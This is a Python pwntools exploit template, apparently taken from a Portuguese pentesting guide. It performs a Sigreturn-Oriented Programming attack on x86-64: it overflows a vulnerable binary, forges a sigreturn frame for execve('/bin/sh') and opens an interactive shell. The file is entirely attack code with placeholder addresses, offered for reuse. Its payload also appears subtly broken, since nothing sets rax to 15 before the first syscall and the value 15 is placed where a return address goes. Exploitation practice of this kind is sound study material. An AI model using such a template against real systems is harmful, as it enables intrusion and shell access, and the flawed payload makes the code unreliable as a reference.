#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Template: srop_x86_64 — Sigreturn-Oriented Programming (SROP)
#
# > Fonte: [Bíblia do Pentest BR](https://0xmorte.gitbook.io/bibliadopentestbr/)
# > Seção: Linguagens & Runtimes — memory corruption (SROP)
# > Última sincronização: 2026-11-05
#
# Placeholders:
#   $BIN          — caminho do binário vulnerável
#   $OFFSET       — offset até o return address
#   $SYSCALL_RET  — endereço (hex, sem 0x) de `syscall; ret` (gadget)
#   $BINSH        — endereço (hex, sem 0x) de "/bin/sh" (na libc ou .data)
#
# Monta um frame de sigreturn no stack: ao retornar para syscall; ret, o kernel
# restaura os registradores do frame (rax=59 execve, rdi=$BINSH), dando execve sem
# precisar de muitos gadgets. Requer um gadget `syscall; ret` e controle de stack.

from pwn import *

context.arch = "amd64"
context.log_level = "error"

BIN = "$BIN"
OFFSET = $OFFSET
SYSCALL_RET = 0x$SYSCALL_RET
BINSH = 0x$BINSH

frame = SigreturnFrame()
frame.rax = 59          # execve
frame.rdi = BINSH
frame.rsi = 0
frame.rdx = 0
frame.rsp = BINSH + 0x100
frame.rip = SYSCALL_RET

payload = b"A" * OFFSET
payload += p64(SYSCALL_RET)  # primeira syscall para disparar o sigreturn
payload += p64(15)           # rax = rt_sigreturn
payload += bytes(frame)

p = process(BIN)
p.sendline(payload)
p.interactive()
